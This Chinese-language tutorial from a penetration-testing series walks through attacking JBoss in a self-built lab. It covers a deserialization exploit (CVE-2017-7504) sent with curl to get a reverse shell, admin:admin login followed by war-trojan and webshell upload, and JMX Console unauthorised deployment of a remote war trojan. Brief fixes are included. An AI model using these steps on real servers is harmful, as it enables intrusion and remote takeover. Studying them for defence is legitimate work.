## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

中间件是介于应用系统和系统软件之间的一类软件，它使用系统软件所提供的基础服务（功能），衔接网络上应用系统的各个部分或不同的应用，能够达到资源共享、功能共享的目的。

可想而知中间件连接着网络和系统接触着越来越多的关键数据，渐渐成为单位公共安全中最具有战略性的资产，中间件的安全稳定运行也直接决定着业务系统能否正常使用。并且平台的中间件中往往连接数据库，而数据库储存着等极其重要和敏感的信息。如果中间件被攻破，这些信息一旦被篡改或者泄露，轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。所以对数据库的保护是一项必须的，关键的，重要的工作任务。

通过前几期钓鱼、内网攻防篇章落幕后，引来了服务攻防篇章之数据库渗透篇，不管在外网还是内网环境，只要存在业务系统都存在数据库，在渗透测试对数据库的知识学习是必不可少的，接下来将介绍数据库的渗透基本操作，带小伙伴们了解和学习数据库如何渗透的！

今天会讲解到学习JBoss EJBInvokerServle 反序列化漏洞（CVE-2013-4810）、Administration Console
弱口令、低版本JMX
Console未授权访问等渗透操作等，最后远程代码执行控制服务器等操作，如果连JBoss都不会安装操作提权等，怎么进行下一步的研究JBoss安全！怎么拿下对方服务器？

## 二、JBoss渗透攻防详解

### 1、JBossMQ JMS 反序列化漏洞（CVE-2017-7504）

`JBoss AS 4.x`及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation
Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

`影响范围：`JBoss 4.x 以及之前的所有版本！

#### 1）安装JBoss4.2.3

（1）下载JBoss4.2.3  
![1630727437_6132ed0d21c5da49da0a6.png!small?1630727437480](https://image.3001.net/images/20210904/1630727437_6132ed0d21c5da49da0a6.png!small?1630727437480)

（2）安装JDK6

![1630727444_6132ed14760968326677f.png!small?1630727446835](https://image.3001.net/images/20210904/1630727444_6132ed14760968326677f.png!small?1630727446835)

（3）配置环境变量

    
    
    JBOSS_HOME
    C:\jboss-4.2.3.GA
    ;%JBOSS_HOME%\bin;
    

![1630727449_6132ed19a94d901f71bbb.png!small?1630727450197](https://image.3001.net/images/20210904/1630727449_6132ed19a94d901f71bbb.png!small?1630727450197)

（4）运行run.bat  
![1630727454_6132ed1e43988ebddb614.png!small?1630727454952](https://image.3001.net/images/20210904/1630727454_6132ed1e43988ebddb614.png!small?1630727454952)  
显示info成功！  
![1630727458_6132ed22b0a87ae8e6855.png!small?1630727460299](https://image.3001.net/images/20210904/1630727458_6132ed22b0a87ae8e6855.png!small?1630727460299)

（5）配置远程登录  
进入目录：

    
    
    C:\jboss-4.2.3.GA\server\default\deploy\jboss-web.deployer
    

编辑server.xml：  
![1630727463_6132ed274e01dbc980ef2.png!small?1630727469533](https://image.3001.net/images/20210904/1630727463_6132ed274e01dbc980ef2.png!small?1630727469533)

修改完成后关闭run.bat重新执行一遍!

![1630727466_6132ed2adaadc480d1c90.png!small?1630727469533](https://image.3001.net/images/20210904/1630727466_6132ed2adaadc480d1c90.png!small?1630727469533)  
成功远程访问！！

#### 2）验证漏洞

访问：

    
    
    /jbossmq-httpil/HTTPServerILServlet
    

![1630727473_6132ed312342db408ee9b.png!small?1630727473835](https://image.3001.net/images/20210904/1630727473_6132ed312342db408ee9b.png!small?1630727473835)  
出现该页面存在漏洞！

#### 3）漏洞利用

这里直接利用CVE-2017-12149生成的ser，发送到/jbossmq-httpil/HTTPServerILServlet接口中：

    
    
    curl http://192.168.253.91:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
    

![1630727478_6132ed363ff7e95ac54a2.png!small?1630727482334](https://image.3001.net/images/20210904/1630727478_6132ed363ff7e95ac54a2.png!small?1630727482334)  
成功获得反弹shell！

#### 4）修复建议

升级至最新版！！

### 4、JBoss EJBInvokerServle 反序列化漏洞（CVE-2013-4810）

输入http://x.x.x.x:8080/invoker/EJBInvokerServle能返回结果就可以利用！

与CVE-2015-7501漏洞原理相同，这里详细介绍一下两者的区别，其区别就在于两个漏洞选择的进行其中JMXInvokerServlet和EJBInvokerServlet利用的是org.jboss.invocation.MarshalledValue进行的反序列化操作，而web-console/Invoker利用的是org.jboss.console.remote.RemoteMBeanInvocation进行反序列化并上传构造的文件。

### 2、Administration Console 弱口令

Administration Console管理页面存在弱口令，`admin:admin`，登陆后台上传war包！

#### 1）存在管理页面

![1630727484_6132ed3c8d33f4c621e6f.png!small?1630727485815](https://image.3001.net/images/20210904/1630727484_6132ed3c8d33f4c621e6f.png!small?1630727485815)

![1630727489_6132ed41a17a09077e3be.png!small?1630727490672](https://image.3001.net/images/20210904/1630727489_6132ed41a17a09077e3be.png!small?1630727490672)

#### 2）爆破或弱口令登录

admin/admin登录：  
![1630727495_6132ed47e18d7c0f49633.png!small?1630727511594](https://image.3001.net/images/20210904/1630727495_6132ed47e18d7c0f49633.png!small?1630727511594)

#### 3）上传war木马

点击Add a new resource，上传war包：  
![1630727500_6132ed4c2fe0bda76b1a3.png!small?1630727511594](https://image.3001.net/images/20210904/1630727500_6132ed4c2fe0bda76b1a3.png!small?1630727511594)  
成功上传dayu.war！！

点击创建的war包进入下一层，若状态为stop，点击Start按钮（默认都是start状态，不需要点击Start按钮）：  
![1630727504_6132ed501ff1ff304a9c6.png!small?1630727511593](https://image.3001.net/images/20210904/1630727504_6132ed501ff1ff304a9c6.png!small?1630727511593)

![1630727508_6132ed542338c2ad4dc59.png!small?1630727511593](https://image.3001.net/images/20210904/1630727508_6132ed542338c2ad4dc59.png!small?1630727511593)

  

#### 4）成功控制

访问:

    
    
    http://192.168.253.89:8080/dayu/dayu.jsp
    

![1630727513_6132ed593c631e48dcf0c.png!small?1630727514814](https://image.3001.net/images/20210904/1630727513_6132ed593c631e48dcf0c.png!small?1630727514814)

或者上传冰蝎一句话jsp：  
![1630727517_6132ed5d2ccfc7156a868.png!small?1630727519608](https://image.3001.net/images/20210904/1630727517_6132ed5d2ccfc7156a868.png!small?1630727519608)  
也是可以直接控制的!

#### 5）修复建议

 **（1）修改密码**

    
    
    C:\jboss-6.1.0.Final\server\default\conf\props\jmx-console-users.properties
    

![1630727522_6132ed62103cf4a1268fa.png!small?1630727524125](https://image.3001.net/images/20210904/1630727522_6132ed62103cf4a1268fa.png!small?1630727524125)

**（2）或删除Administration Console页面**

JBoss版本>=6.0，admin-console页面路径为：

    
    
    C:\jboss-6.1.0.Final\common\deploy\admin-console.war
    

6.0之前的版本，路径为：

    
    
    C:\jboss-4.2.3\server\default\deploy\management\console-mgr.sar\web-console.war
    

### 3、低版本JMX Console未授权访问

#### 1）JMX Console漏洞简介

Jboss管理控制台，访问控制不严导致的漏洞！

jboss 4.x 及其之前的版本 console 管理路径为 /jmx-console/ 和 /web-console/ ！

jmx-console的配置文件为：

    
    
    /opt/jboss/jboss4/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml
    #jboss的绝对路径不同网站不一样
    

web-console的配置文件为：

    
    
    /opt/jboss/jboss4/server/default/deploy/management/console-mgr.sar/web-console.war/WEB-INF/jboss-web.xml
    #jboss的绝对路径不同网站不一样
    

控制台账号密码  
jmx-console 和 web-console共用一个账号密码 ，账号密码文件在：

    
    
    /opt/jboss/jboss4/server/default/conf/props/jmx-console-users.properties
    

![1630727529_6132ed6943225822bfbea.png!small?1630727531233](https://image.3001.net/images/20210904/1630727529_6132ed6943225822bfbea.png!small?1630727531233)

操作版本：JBoss4.2.3

#### 2）未授权访问

JMX Console默认存在未授权访问，直接点击JBoss主页中的JMX Console链接进入JMX Console页面。

![1630727534_6132ed6e6597133466eae.png!small?1630727535481](https://image.3001.net/images/20210904/1630727534_6132ed6e6597133466eae.png!small?1630727535481)

#### 3）本地搭建部署点

进来后找到jboss.deployment：

![1630727538_6132ed7282696618bffed.png!small?1630727539883](https://image.3001.net/images/20210904/1630727538_6132ed7282696618bffed.png!small?1630727539883)

进入页面后找到void addURL()：  
![1630727543_6132ed7715775d38f678f.png!small?1630727544698](https://image.3001.net/images/20210904/1630727543_6132ed7715775d38f678f.png!small?1630727544698)

#### 4）搭建远程部署

此时部署我们远程的war木马，部署好了以后点击Invoke：  
![1630727550_6132ed7e236c9b37a95bb.png!small?1630727554016](https://image.3001.net/images/20210904/1630727550_6132ed7e236c9b37a95bb.png!small?1630727554016)

    
    
    python -m SimpleHTTPServer 80
    

#### 5）上传部署

然后输入Invoke：

    
    
    http://192.168.253.9/dayutest.war
    

![1630727555_6132ed830b92f44e1bee7.png!small?1630727555655](https://image.3001.net/images/20210904/1630727555_6132ed830b92f44e1bee7.png!small?1630727555655)  
点击后部署成功！

#### 6）检查部署情况

随后来到URLList中查看Value值是否已经部署好，并且为我们的远程war木马地址：  
![1630727559_6132ed87e1e9cf84e4bea.png!small?1630727565999](https://image.3001.net/images/20210904/1630727559_6132ed87e1e9cf84e4bea.png!small?1630727565999)  
最后点击Apply Changes 后耐心等待一会儿，然后回到JMX-Console目录中：  
![1630727563_6132ed8b7ad2853616853.png!small?1630727565999](https://image.3001.net/images/20210904/1630727563_6132ed8b7ad2853616853.png!small?1630727565999)  
找到jboss.web.deployment后查看是否存在我们部署的war木马！！

#### 7）完成控制

访问：  
![1630727568_6132ed904436f2b6aae3b.png!small?1630727568803](https://image.3001.net/images/20210904/1630727568_6132ed904436f2b6aae3b.png!small?1630727568803)

    
    
    http://192.168.253.91:8080/dayutest/shell.jsp
    

![1630727572_6132ed948c5d114c2220c.png!small?1630727573473](https://image.3001.net/images/20210904/1630727572_6132ed948c5d114c2220c.png!small?1630727573473)  
成功控制并交互！

## 三、总结

今天学到了JBoss EJBInvokerServle 反序列化漏洞（CVE-2013-4810）、Administration Console
弱口令、低版本JMX
Console未授权访问等漏洞渗透操作，最后远程代码执行控制服务器等操作，以及整改加固建议的方式方法，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！

    
    
    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）-> 服务攻防之数据库Oracle（上）-> 服务攻防之数据库Oracle（下）-> 服务攻防之数据库Redis（上）-> 服务攻防之数据库Redis（下）-> 服务攻防之数据库Mongodb（上）-> 服务攻防之数据库Mongodb（下）-> 服务攻防之中间件IIS（上）-> 服务攻防之中间件IIS（下）-> 服务攻防之中间件Apache（总）-> 服务攻防之中间件Nginx（总）-> 服务攻防之中间件Tomcat（上）-> 服务攻防之中间件Tomcat（下）-> 服务攻防之中间件JBoss（上）-> 服务攻防之中间件JBoss（中）......
    

接下来在《服务攻防之中间件JBoss（下）》会接触到如何进行高版本JMX Console未授权访问、JMX Console HtmlAdaptor
Getshell利用、总结JBoss渗透思路、jexboss自动化JBoss渗透等渗透操作，如何提权渗透等方法，请看下篇服务攻防之中间件nginx篇下章！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

